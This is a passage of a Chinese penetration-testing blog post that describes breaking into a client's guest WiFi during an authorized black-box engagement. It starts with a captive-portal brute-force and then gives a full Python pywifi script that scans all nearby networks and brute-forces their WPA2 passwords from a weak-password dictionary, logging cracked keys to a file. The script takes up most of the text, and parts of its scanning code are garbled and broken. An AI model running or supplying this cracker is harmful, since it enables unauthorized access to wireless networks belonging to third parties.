从访客网络到潜入机房
原创雪狼别动队 酒仙桥六号部队
2021-01-04原文
这是 酒仙桥六号部队 的第 141 篇文章。
全文共计7917个字，预计阅读时长20分钟。
前言
在一次项目中，客户需求是在完全黑盒的情况下进行渗透测试，目
标是内网某台物理隔离核心系统，由此就展开了我们接下来的测试
行动。
正文
访客WIFI
那是一个阳光明媚的早上，我背着我的小书包来到客户楼下，掏出
我的设备，准备开始工作。
在日常项目中，除了正常的Web资产探测之外，我们也应该合理的利
用各类无线网络、物理接口、智能设备的安全缺陷进行近源渗透测
试，因此到达目标楼下后，我首先搜索了一下周围的WIFI，果然发
现了以目标简称开头的两个热点。
通过测试发现，GUEST热点是普通的密码验证，而Tech热点则无需
密码验证，再连接后会自动弹出登录认证页面。
这里我的思路分别是这样的。
WIFI 认证方式 思路
GUEST 密码 暴力破解WIFI连接密码
Tech 二次登录验证 暴力破解用户名密码
这里感觉如果能拿下Tech热点可能会对我们之后的测试过程更有帮
助，因此我首先对Tech的热点登陆页面进行了暴力破解，以姓名拼
音字典做用户名，弱密码字典为弱口令进行暴力破解。
遗憾的是这里虽然没有对暴力破解进行限制，但是我并没有通过用
户名字典和弱口令字典撞库得出想要的结果，所以接下来又重新看
了一下GUEST对应的热点，通过名称可以大致推断这应该是一个访
客网络。
一般这种场景下为了方便用户使用，密码应该不会设置过于复杂，
这里由于我没有带外接网卡，Kali又在虚拟机中，因此我们可以通
过形如pywifi的库进行破解连接密码，我们在构造字典的时候，例
如目标客服电话、目标简称加数字等等格式都是有极大可能作为密
码的，因此我们也要加载到我们的字典中。
from pywifi import const, PyWiFi, Profile
import time
# wifi类
class wifi(object):
def __init__(self):
self.wifi = PyWiFi() #创建一个无线对象
self.interfaces = self.wifi.interfaces()
#获取无线网卡接口
self.iface = self.interfaces[0]
#获取第一个无线网卡接口
# 获取无线网卡接口
def get_wifi_interfaces(self):
num = len(self.interfaces)
if num = 0 and no  -90: #信号强度<-
90的wifi几乎连不上
wifi_list.append((i.ssid, i.signal)) #添加到wifi列表
print('wifi信号强度：{0}，名称：{1}。'.format(i.signal,
i.ssid))#输出wifi名称
return sorted(wifi_list, key=lambda x:x[1], reverse=True)
#按信号强度由高到低排序
# 连接wifi
def connect_wifi(self, wifi_name, wifi_password):
self.iface.disconnect() #断开无线网卡连接
time.sleep(1) #缓冲1秒
profile_info = Profile() #wifi配置文件
profile_info.ssid = wifi_name #wifi名称
profile_info.auth = const.AUTH_ALG_OPEN #需要密码
profile_info.akm.append(const.AKM_TYPE_WPA2PSK)
#加密类型
profile_info.cipher = const.CIPHER_TYPE_CCMP #加密单元
profile_info.key = wifi_password #wifi密码
self.iface.remove_all_network_profiles()
#删除其他配置文件
tmp_profile = self.iface.add_network_profile(profile_info)
#加载配置文件
self.iface.connect(tmp_profile) #连接
#尝试5秒是否能成功连接(时间过短可能会导致正确密码尚未连接成功)
time.sleep(5)
if self.iface.status() == const.IFACE_CONNECTED:
print('\n=======================================================
===================')
print('wifi：{0}连接成功，密码：{1}'.format(wifi_name,
wifi_password), end='')
print('=========================================================
=================\n')
return True
else:
print('密码错误：{0}'.format(wifi_password), end='')
return False
# 断开无线网卡已连接状态
def disconnect_wifi(self):
self.iface.disconnect()
if self.iface.status() in [const.IFACE_DISCONNECTED,
const.IFACE_INACTIVE]:
print('无线网卡：%s 已断开。' % self.iface.name())
else:
print('无线网卡：%s 未断开。' % self.iface.name())
if __name__ == '__main__':
sf = ['Y', 'y', 'N', 'n']
dian = input('是否需要手动点击破解下一个wifi热点(Y/N)？').strip()
wifi = wifi() #实例化wifi类
wifi.get_wifi_interfaces() #获取网卡接口
wifi.check_interfaces() #检测网卡连接状态
print('\n正在扫描wifi热点...')
wifiList = wifi.scan_wifi() #扫描周围wifi
print('\n正在破解，时间较长，请耐心等待...')
#所有破解成功的wifi名称及密码
user_pwd = []
# 只能单线程破解，因为只有一个无线网卡，不能同时连接多个wifi热点
for i in wifiList:
print('正在破解%s，请耐心等待...' % i[0])
start = time.time()
with open(r'1800常用弱口令字典.txt', 'r') as f:
for password in f:
try:
result = wifi.connect_wifi(i[0], password)
#尝试连接wifi
if result == True:
#若找到密码，则跳出，避免继续查找
user_pwd.append((i[0], password))
#保存破解成功的wifi及密码
break
except:
continue
end = time.time()
shi = end - start
print('破解耗时：%s秒。' % shi)
if dian == 'Y' or dian == 'y':
xia = input('是否继续破解(Y/N)？').strip()
while xia not in sf:
print('输入错误，请重新输入！')
xia = input('是否继续破解(Y/N)？')
if xia == 'Y' or xia == 'y':
continue
else:
break
print('\n=======================================================
===================')
print('最终统计结果为：')
with open(r'c:/users/administrator/desktop/wifi.txt', 'a') as
pwd:
for p in user_pwd:
pwd.write('wifi热点：%s，密码：%s' % (p[0], p[1]))
print(('wifi热点：%s，密码：%s' % (p[0], p[1])), end='')